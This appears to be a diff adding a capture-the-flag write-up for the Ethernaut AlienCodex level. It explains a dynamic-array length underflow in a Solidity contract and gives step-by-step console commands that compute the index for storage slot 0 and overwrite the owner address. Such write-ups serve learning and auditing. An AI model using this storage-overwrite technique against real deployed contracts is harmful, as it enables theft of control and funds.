@@ -1112,5 +1112,102 @@ await contract.setSolver(solverAddr);
 
 ---
 
+### 3. Submitted the instance
+
 ## Level Completed
 ![Level Complete Output](assets/magicnumber.png)
+
+
+# Ethernaut Level 19: AlienCodex
+
+## Strategy
+
+- **Objective**: Claim ownership of the `AlienCodex` contract.
+- **Vulnerability**: The `retract()` function causes an underflow in the dynamic array `codex`, extending its length to the entire 2²⁵⁶ storage space of the contract. This lets me overwrite any storage slot—including slot `0`, which holds the `owner` address.
+- **Approach**:
+  1. Trigger the `contacted` modifier using `makeContact()`.
+  2. Exploit the underflow bug via `retract()`.
+  3. Calculate the array index `i` that maps to slot `0`.
+  4. Use `revise(i, content)` to overwrite the `owner` variable with my own address.
+
+---
+
+## Understanding the Storage Layout
+
+| Slot         | Content                              |
+|--------------|--------------------------------------|
+| 0            | `owner` (20 bytes) + `contact` (1 byte) |
+| 1            | `codex.length`                       |
+| keccak256(1) | Start of `codex` array               |
+
+- The dynamic array `codex` does not start at slot 1—it starts at `keccak256(1)`.
+- After causing an underflow in `codex.length`, I was able to write to any slot by finding an index `i` such that:  
+  `keccak256(1) + i ≡ 0 mod 2²⁵⁶`  
+  ⟶ `i = 2²⁵⁶ - keccak256(1)`
+
+---
+
+### 1. I Enabled the Contacted Modifier
+
+```
+await contract.make_contact();
+```
+
+This set `contact = true`, so I could use `retract()` and `revise()`.
+
+---
+
+### 2. Caused an Array Underflow
+
+```
+await contract.retract();
+```
+
+This changed `codex.length` from 0 to `2^256 - 1`, making the array span all of contract storage.
+
+---
+
+### 3. Calculated the Slot Offset
+
+```
+const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
+// Output: '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
+
+const i = BigInt(2n ** 256n) - BigInt(p);
+// Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n
+```
+
+This index maps directly to storage slot `0`.
+
+---
+
+### 4. Prepared the Payload to Overwrite Owner
+
+```
+const content = '0x' + '0'.repeat(24) + player.slice(2);
+// Output: '0x000000000000000000000000<player_address>'
+```
+
+Padded my address with 12 bytes of `0x00` to form a 32-byte `bytes32` value.
+
+---
+
+### 5. Overwrote the Owner Variable
+
+```
+await contract.revise(i, content);
+```
+
+This wrote the padded player address into slot `0`, overwriting the contract's `owner`.
+
+---
+
+### Level Completed
+
+```
+await contract.owner() === player; // true
+```
+
+Verified ownership and submitted the instance.
+
+![Level Complete Output](assets/aliencodex.png)
